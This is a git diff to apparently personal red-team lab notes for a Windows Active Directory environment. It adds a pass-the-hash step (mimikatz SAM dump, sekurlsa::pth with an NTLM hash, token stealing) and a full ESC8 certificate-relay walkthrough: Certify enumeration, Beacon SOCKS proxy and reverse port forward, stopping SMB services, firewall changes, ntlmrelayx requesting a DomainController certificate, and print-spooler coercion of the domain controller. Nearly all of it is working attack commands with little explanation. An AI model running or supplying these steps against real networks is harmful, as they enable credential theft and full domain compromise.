@@ -86,7 +86,7 @@ jump scshell64 lon-ws-1 smb
 ```
 
 ---
-# User impersonate
+# Pass the Hash
 
 ```
 mimikatz !lsadump::sam
@@ -94,6 +94,8 @@ mimikatz !lsadump::sam
 mimikatz sekurlsa::pth /user:Administrator /domain:LON-WS-1 /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
 
 steal_token 1088
+
+ls \\lon-ws-1\c$
 ```
 
 ---
@@ -252,3 +254,99 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
     1. `Get-ADComputer -Filter * -Server lon-dc-1`
     2. `Get-ADUser -Filter * -Server lon-dc-1`
     3. `Get-ADOrganizationalUnit -Filter * -Server lon-dc-1`
+
+# ESC8
+
+## Enumeration
+Enumerate the certificate authority for vulnerabilities.
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
+```
+## Relay Setup
+
+1. Use Beacon to start a SOCKS proxy.
+```
+socks 1080 socks5
+```
+
+1. Run netstat to see that port 445 is currently bound.
+```
+netstat
+```
+
+1. Set the _lanmanserver_ service's start mode to _disabled_ to prevent it from automatically restarting.
+```
+sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4`
+```
+
+2. Stop these services in the following order to unbind port 445.
+```
+sc_stop lanmanserver
+sc_stop srv2
+sc_stop srvnet
+```
+
+> Run netstat and verify that 445 is no longer bound.
+
+3. Start a reverse port forward that will bind to port 445 and redirect the traffic to _127.0.0.1:7445_ on the attacker desktop.
+```
+rportfwd_local 445 localhost 7445
+```
+> netstat will show 445 being bound again, but the PID will be that of the Beacon.
+
+4. Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation. Add the rule:
+```
+powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
+```
+
+## Relaying
+
+1. On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
+```
+docker container start -i kali-1
+```
+
+1. Configure proxychains to use Cobalt's SOCKS proxy.
+    1. Open /etc/proxychains.conf in vim or nano.
+    2. Scroll to the last line.
+    3. Replace the default socks4 entry with ``socks5 10.0.0.5 1080``
+    4. Save the changes.
+
+2. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint. We're going to relay the credentials of a domain controller, so we'll specifically request a _DomainController_ certificate.
+```
+proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
+
+3. Coerce the domain controller into authenticating to the current machine.
+```
+`execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108`
+```
+> The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy. A file called **LON-DC-1.pfx** should be created.
+
+4. Press Ctrl+C to stop ntlmrelayx.
+
+## Cleanup
+
+1. Stop the SOCKS proxy.
+```
+socks stop
+```
+
+1. Stop the reverse port forward.
+```
+rportfwd stop 445
+```
+
+1. Restore the services back to default.
+```
+sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
+
+sc_start srvnet
+sc_start srv2
+sc_start lanmanserver
+```
+
+1. Remove the firewall rule.
+```
+powerpick Remove-NetFirewallRule -DisplayName "File Sharing"`
+```
